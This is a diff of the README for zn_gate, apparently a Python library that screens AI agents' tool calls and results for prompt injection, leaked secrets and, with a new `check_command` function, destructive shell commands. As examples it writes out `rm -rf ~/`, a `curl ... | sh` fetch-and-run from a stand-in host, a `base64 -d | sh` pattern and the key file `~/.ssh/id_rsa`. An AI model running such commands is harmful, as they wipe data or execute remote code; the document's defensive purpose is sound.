@@ -20,9 +20,7 @@
 
 ## Install
 
-Install it in a virtual environment. Many recent Linux systems, and Homebrew's Python on macOS, refuse `pip install` outside one, with an "externally-managed-environment" error:
-
-On Debian and Ubuntu, `python3 -m venv` needs the `python3-venv` package first: `sudo apt update && sudo apt install python3-venv`.
+Install it in a virtual environment. Many recent Linux systems, and Homebrew's Python on macOS, refuse `pip install` outside one, with an "externally-managed-environment" error. On Debian and Ubuntu, `python3 -m venv` also needs the `python3-venv` package first: `sudo apt update && sudo apt install python3-venv`.
 
 ```bash
 python3 -m venv .venv
@@ -96,7 +94,7 @@ print(r.verdict)           # allow
 
 **Galvanize: prompt-injection detection**
 
-- Today, local: `evaluate`, `check_tool_call`, `check_tool_result` and `@guard` run a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides, comment splicing and Base64.
+- Today, local: `evaluate`, `check_tool_call`, `check_tool_result` and `@guard` run a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides and comment splicing. Shell commands that decode Base64 text and run it (for example `... | base64 -d | sh`) are recognised; a Base64 string on its own is not decoded.
 - Today, optional cloud: `analyze()` can also query the Galvanize 3 classifier ([announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=pypi&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), has open weights under Apache-2.0), only with `ZN_CLOUD=1` and `ZN_API_KEY`.
 - Roadmap: running Galvanize locally.
 
@@ -150,7 +148,17 @@ With `check_result` or `mask_secrets` (both on by default in `guarded_tool`), `@
 - **Objects**: a result that is a pydantic model, a dataclass or another plain object is read field by field. With `mask_secrets` a secret inside it is masked, and the model gets the object as plain data (a dict) with the secret hidden. A secret that cannot be masked blocks the result (rule `secret:unmaskable`).
 - **Errors**: agent frameworks send the message of a tool's exception to the model (LangChain `handle_tool_error`, LangGraph `ToolNode`, the OpenAI Agents SDK, CrewAI), so it is checked and masked like the output. A blocked message raises `GuardBlockError` (or returns the `fallback`). A message with a secret is raised again as an exception of the same type that carries only the masked message, without the original exception attached; when the type cannot be rebuilt that way, `zn_gate.guard.MaskedToolError` (a `RuntimeError`) is raised instead. Other exceptions are raised unchanged.
 
-`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
+`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. To check a shell command, call `check_command` yourself before you run it. It looks at one command (Bash, sh, zsh or PowerShell text) for destructive shapes such as a recursive delete of the home folder or the root, or a write to a disk device, and works offline:
+
+```python
+from zn_gate import check_command
+
+print(check_command("ls -la /tmp/example").verdict)  # allow
+a = check_command("rm -rf ~/")
+print(a.verdict, a.rule)                              # block destructive:rm_root_home
+```
+
+Only the rules listed in [Destructive commands](https://github.com/usezn/zn/blob/main/docs/destructive-commands.md) are checked, so decide in your own code which tools may delete files or run commands.
 
 Runnable example with Microsoft Semantic Kernel: [examples/semantic-kernel-agent](https://github.com/usezn/zn/tree/main/examples/semantic-kernel-agent).
 
@@ -325,6 +333,7 @@ Runnable examples for the Python package, in [`examples/`](https://github.com/us
 | [`openai-agents-sdk`](https://github.com/usezn/zn/tree/main/examples/openai-agents-sdk) | Python | OpenAI Agents SDK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 | [`pydantic-ai-agent`](https://github.com/usezn/zn/tree/main/examples/pydantic-ai-agent) | Python | Pydantic AI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 | [`google-adk-agent`](https://github.com/usezn/zn/tree/main/examples/google-adk-agent) | Python | Google ADK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`ag2-agent`](https://github.com/usezn/zn/tree/main/examples/ag2-agent) | Python | AG2 | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 
 ## FAQ
 
